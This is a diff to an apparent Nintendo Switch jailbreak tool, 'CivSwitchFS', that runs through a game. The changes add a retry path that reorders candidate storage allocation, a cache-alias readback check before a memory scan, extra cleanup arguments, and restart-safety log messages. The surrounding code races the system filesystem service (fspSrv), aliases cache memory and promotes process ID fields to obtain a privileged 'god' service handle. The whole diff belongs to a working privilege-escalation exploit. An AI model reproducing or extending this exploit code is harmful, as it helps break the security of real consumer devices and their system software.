@@ -34,7 +34,8 @@ import {
 } from "./core/steps/discovery.mjs";
 import {
   retireCandidateCacheAndClose,
-  cleanupScratchAndHandles
+  cleanupScratchAndHandles,
+  formatUnsafeState
 } from "./core/steps/cleanup.mjs";
 import {createFspIdentityHelpers} from "./core/helpers/index.mjs";
 import {runPromotionStep} from "./core/promotion.mjs";
@@ -182,11 +183,14 @@ export async function run() {
         let canaryTimingSchedule = null;
         let attemptLimit = BASE_ATTEMPTS;
         let positiveWindowsTotal = 0;
+        let usePreReservation = false;
+        let preReservationFallbackUsed = false;
 
-        await log("CivSwitchFS (no RPC) by Nerisma\n" +
-            "Thanks to Slapah (civ port)\n" +
-            "Thanks to Pespipu (original ns2jb)\n" +
-            "Thanks to Kurumuz (ns2jb improvements)");
+        await log(
+            "==========================\n" +
+            "CivSwitchFS (no RPC) by Nerisma\n" +
+            "Thanks to Slapah, Pepsipu, Kurumuz and Alula\n" +
+            "==========================");
         await log(isVerboseLogging()
             ? "Verbose logging is on (controller Y toggles the mode)."
             : "Normal logging is on (controller Y enables verbose summaries).");
@@ -194,6 +198,10 @@ export async function run() {
         for (let attempt = 1; attempt <= attemptLimit; attempt++) {
             if (timingPersistence.stopRequested) return;
             await log("======== ATTEMPT " + attempt + " ========");
+            if (usePreReservation) {
+                await log("Retrying with the reservation group opened before " +
+                    "candidate storage.");
+            }
             if (timingPersistence.stopRequested) return;
             timingPersistence.currentAttempt = attempt;
             if (timingPersistence.resetPending) {
@@ -206,18 +214,22 @@ export async function run() {
             }
             // The hard-cap attempt verifies the last schedule without retuning.
             const result = await runTrackedAttempt(canaryTimingSchedule,
-                attempt < MAX_TOTAL_ATTEMPTS, timingPersistence);
+                attempt < MAX_TOTAL_ATTEMPTS, timingPersistence,
+                usePreReservation);
             positiveAttemptsTotal += result.positiveAttempts || 0;
             positiveWindowsTotal += result.positiveWindows || 0;
             qualifiedCanaryFlipsTotal += result.qualifiedCanaryFlips || 0;
 
-            if (timingPersistence.stopRequested || result.stoppedByUser)
+            if (timingPersistence.stopRequested || result.stoppedByUser) {
+                await logSafeRestartStatus(result);
                 return;
+            }
 
             if (result.permissionProven) {
                 if (result.promotionRestored && result.safeToRetry) {
                     await log("Attempt complete.");
                 }
+                await logSafeRestartStatus(result);
                 return;
             }
 
@@ -244,6 +256,29 @@ export async function run() {
                 }
             }
 
+            if (result.retryWithPreReservation &&
+                !preReservationFallbackUsed &&
+                attempt < MAX_TOTAL_ATTEMPTS) {
+                preReservationFallbackUsed = true;
+                usePreReservation = true;
+                if (attempt === attemptLimit &&
+                    attempt < MAX_TOTAL_ATTEMPTS) {
+                    attemptLimit = attempt + 1;
+                    await log("Adding one attempt to test the alternate " +
+                        "candidate allocation order.");
+                }
+                await log("Cleanup was verified. The next attempt will open " +
+                    "the reservation group before candidate storage.");
+            } else if (result.retryWithPreReservation &&
+                !preReservationFallbackUsed) {
+                await log("The hard attempt limit was reached; the alternate " +
+                    "candidate allocation order was not tested.");
+            } else if (usePreReservation && result.preReservationTested) {
+                usePreReservation = false;
+                await log("The reservation-first candidate attempt finished; " +
+                    "later attempts will use the default order.");
+            }
+
             if (attempt === attemptLimit) {
                 const rate = positiveAttemptsTotal > 0
                     ? positiveWindowsTotal / positiveAttemptsTotal : null;
@@ -257,8 +292,9 @@ export async function run() {
                     ? " Restart the game before another run."
                     : "";
                 await log("Stopped after " + attempt +
-                    " attempts; user storage access was not verified. " +
+                    " attempts; user storage access was not verified.\n" +
                     windowSummary + restartHint);
+                await logSafeRestartStatus(result);
                 return;
             }
 
@@ -303,10 +339,15 @@ export async function run() {
             inputControls?.dispose?.();
             setVerboseLogging(previousVerboseLogging);
             try {
+                let finalSummary = null;
+                if (experimentMode) {
+                    finalSummary = formatCanaryFlipSummary(
+                        qualifiedCanaryFlipsTotal, positiveAttemptsTotal);
+                }
+
                 await flushDeferredWaveLogLines(
                     timingPersistence.deferredWaveLogLines,
-                    formatCanaryFlipSummary(qualifiedCanaryFlipsTotal,
-                        positiveAttemptsTotal));
+                    finalSummary);
             } catch (error) {
                 try {
                     await log("Could not display deferred wave logs: " +
@@ -315,6 +356,15 @@ export async function run() {
             }
         }
     }
+}
+
+async function logSafeRestartStatus(result) {
+    if (!result?.safeToRetry) {
+        return;
+    }
+
+    await log("STATE IS SAFE TO RESTART - Relaunch the game normally; " +
+        "no hard reboot needed.");
 }
 
 function formatCanaryFlipSummary(qualifiedFlips, positiveWaves) {
@@ -734,8 +784,12 @@ function reportAddressProgress(message) {
 // ---------------------------------------------------------------------------
 
 async function runTrackedAttempt(canaryTimingSchedule,
-    allowTimingAdjustments = true, timingPersistence = null) {
+    allowTimingAdjustments = true, timingPersistence = null,
+    usePreReservation = false) {
     const attemptState = {
+        usePreReservation: usePreReservation === true,
+        preReservationTested: false,
+        retryWithPreReservation: false,
         permissionProven: false,
         stoppedByUser: false,
         qualifiedCanaryFlips: 0,
@@ -831,21 +885,42 @@ async function runTrackedAttempt(canaryTimingSchedule,
         const lightCleanupComplete = attemptState.lightCleanupVerified &&
             attemptState.holeCleanupVerified && trackingEnded;
         await log(lightCleanupComplete
-            ? "Temporary handles closed; fspSrv and candidate storage remain open."
-            : "Cleanup incomplete; fspSrv and candidate storage remain open.");
+            ? "Temporary handles closed.\nfspSrv and candidate storage remain open."
+            : "Cleanup incomplete.\nfspSrv and candidate storage remain open.");
     } else if (attemptState.pidPromotionVerified) {
         const cleanupComplete = attemptState.cleanupVerified &&
             attemptState.holeCleanupVerified && trackingEnded &&
             attemptState.promotionTestHandlesClosed;
         await log(cleanupComplete
-            ? "Promotion complete; temporary handles closed; PID fields remain promoted."
-            : "Promotion complete; cleanup incomplete; PID fields remain promoted.");
+            ? "Promotion complete; temporary handles closed.\nPID fields remain promoted."
+            : "Promotion complete, but cleanup incomplete.\nPID fields remain promoted.");
     } else if (attemptState.safeToRetry) {
-        await log(attemptState.cleanupVerified
-            ? "Cleanup complete."
-            : "Cleanup is sufficient for another attempt.");
-    } else {
-        await log("Cleanup failed; another attempt is unsafe.");
+        await log("STATE IS SAFE - continuing.");
+    } else if (!attemptState.retainedEndpointActive &&
+        attemptState.cacheRetirementVerified &&
+        attemptState.workerStateSafe &&
+        attemptState.workersQuiesced &&
+        !executionError) {
+        // The cache readback is a separate requirement: a clean entry avoids
+        // the dirty-flush hazard, but does not prove a fresh storage handle
+        // can no longer observe the alias.
+        await log("STATE IS SAFE TO RESTART - Relaunch the game normally; " +
+            "no hard reboot needed.");
+    } else if (!(attemptState.retainedEndpointActive &&
+            !attemptState.cacheRetirementVerified)) {
+        // No dedicated verdict fires for this ending: keep the explicit
+        // unknown-state instruction instead of a vague cleanup note.
+        await log("STATE IS UNKNOWN - hard reboot now " +
+            "(hold Power for 15 seconds).");
+    }
+
+    // The promotion-retained path keeps the endpoint on purpose, so an
+    // unretired cache there is not a retirement failure.
+    if (!attemptState.promotionRetained &&
+        attemptState.retainedEndpointActive &&
+        !attemptState.cacheRetirementVerified) {
+        await log(formatUnsafeState(
+            "Retained endpoint is active and cache retirement failed."));
     }
 
     if (executionError)
@@ -862,6 +937,8 @@ async function runTrackedAttempt(canaryTimingSchedule,
         if (!timingPersistence?.resetRequested)
             await clearVisualLog();
         await log("You just Civ Sevened your machine, congrats");
+        await log("Cleanup verified: the god fsp-srv handle and its " +
+            "storage remain.");
         if (timingPersistence?.adjustedThisRun &&
             !timingPersistence.resetRequested &&
             !timingPersistence.savedThisRun) {
@@ -1031,8 +1108,8 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
     const stopAndCleanup = async options => {
         cleanupAttempted = true;
         await beginCleanupLog(attemptState);
-        // Cleanup may itself launch cache-retirement waves. If that throws,
-        // keep the allocation scope alive because a worker may still use it.
+        // If cleanup throws while a worker may still use its buffers, keep
+        // the allocation scope alive for the guarded fallback cleanup.
         attemptState.workersQuiesced = false;
         const cleanupOptions = {...options,
             dirtyFileSize: config.DIRTY_FILE_SIZE,
@@ -1291,8 +1368,11 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
         pktBuf: pktBuf,
         rootSession: handles.rootSession,
         storageHandle: handles.storageHandle,
-        workerStateSafe: control.workerStateSafe
+        workerStateSafe: control.workerStateSafe,
+        usePreReservation: attemptState.usePreReservation
     });
+    attemptState.preReservationTested =
+        attemptState.usePreReservation === true;
 
     if (candidateSetup?.candidateHandle && candidateSetup?.primeHex &&
         !candidateSetup?.failureReason) {
@@ -1343,6 +1423,7 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
         config, helpers, REQ: packets.REQ,
         canaryQualified: candidateSetup.canaryQualified,
         candidateHandle: candidateSetup.candidateHandle,
+        preGroup: candidateSetup.preGroup,
         dirtyFilePath: scratch.dirtyFilePath,
         dirtyWriteBuf: control.dirtyWriteBuf,
         dirtyWritePkt: control.dirtyWritePkt,
@@ -1443,6 +1524,38 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
         return;
     }
 
+    if (alias?.aliasInstalled) {
+        const aliasReadback = helpers.inspectCandidateCacheAlias(
+            handles.candidateHandle, {
+                config,
+                aliasControlHex: candidateSetup.aliasControlHex,
+                primeHex: candidateSetup.primeHex
+            });
+        await verboseLog("Cache alias readback=" + aliasReadback.state +
+            (aliasReadback.readbackHex
+                ? " · bytes=" + aliasReadback.readbackHex : "") +
+            (aliasReadback.detail
+                ? " · " + aliasReadback.detail : ""));
+
+        if (aliasReadback.state !== "aliased") {
+            await log("Cache alias readback is " + aliasReadback.state +
+                "; memory search is skipped.");
+            if (aliasReadback.state === "original" &&
+                !attemptState.usePreReservation) {
+                attemptState.retryWithPreReservation = true;
+            }
+            await stopAndCleanup({
+                reason: "Cache copy waves completed, but candidate readback " +
+                    "did not confirm the alias.",
+                scratch, handles, helpers, addressCopy,
+                candidateCacheNeedsRetirement:
+                    Boolean(alias?.candidateCacheNeedsRetirement),
+                workerStateSafe: alias?.workerStateSafe === true
+            });
+            return;
+        }
+    }
+
     if (!alias?.ok || !alias.aliasInstalled) {
         await stopAndCleanup({
             reason: "Cache alias installation was incomplete; " +
@@ -1524,6 +1637,18 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
                 formatCode(baseline?.readError) + "; prefixMatched=" +
                 Boolean(baseline?.prefixMatches) + "; dataBytes=" +
                 (baseline?.prevEnd || 0) + ").");
+            if (!attemptState.usePreReservation) {
+                attemptState.retryWithPreReservation = true;
+            }
+            await stopAndCleanup({
+                reason: "The memory snapshot did not pass its readback checks; " +
+                    "skipping the memory scan.",
+                scratch, handles, helpers, addressCopy,
+                candidateCacheNeedsRetirement:
+                    Boolean(alias.candidateCacheNeedsRetirement),
+                workerStateSafe: addressCopy.workerStateSafe
+            });
+            return;
         }
 
         await log("Searching memory for candidates...");
@@ -1730,7 +1855,8 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
             temporaryHandle: 0,
             triggerHandle: handles.triggerHandle,
             workerStateSafe: promotion.workerStateSafe,
-            dirtyFileSize: config.DIRTY_FILE_SIZE
+            dirtyFileSize: config.DIRTY_FILE_SIZE,
+            dirtyFilePath: scratch.dirtyFilePath
         });
 
         attemptState.promotionRetained = true;
@@ -1773,6 +1899,7 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
                 (promotion.addressCopy || address.addressCopy)
                     .candidateCacheNeedsRetirement),
         candidateHandle: handles.candidateHandle,
+        rootSession: handles.rootSession,
         retireRetainedEndpoint: promotion.retireRetainedEndpoint,
         workerStateSafe: promotion.workerStateSafe
     });
@@ -1809,7 +1936,8 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
         temporaryHandle: 0,
         triggerHandle: handles.triggerHandle,
         workerStateSafe: retired.workerStateSafe,
-        dirtyFileSize: config.DIRTY_FILE_SIZE
+        dirtyFileSize: config.DIRTY_FILE_SIZE,
+        dirtyFilePath: scratch.dirtyFilePath
     });
 
     await verboseLog(formatCleanupResult(cleanup, retired.workerStateSafe));
@@ -1863,6 +1991,7 @@ async function performStopAndCleanup({
                 candidateCacheNeedsRetirement ||
                 Boolean(addressCopy?.candidateCacheNeedsRetirement),
             candidateHandle: retired.candidateHandle,
+            rootSession: handles?.rootSession || 0,
             retireRetainedEndpoint: null,
             workerStateSafe: Boolean(workerStateSafe)
         });
@@ -1896,7 +2025,8 @@ async function performStopAndCleanup({
             ? 0 : handles?.temporaryHandle || 0,
         triggerHandle: handles?.triggerHandle || 0,
         workerStateSafe: finalWorkerStateSafe,
-        dirtyFileSize
+        dirtyFileSize,
+        dirtyFilePath: scratch?.dirtyFilePath || ""
     });
 
     await verboseLog(formatCleanupResult(cleanup, finalWorkerStateSafe));
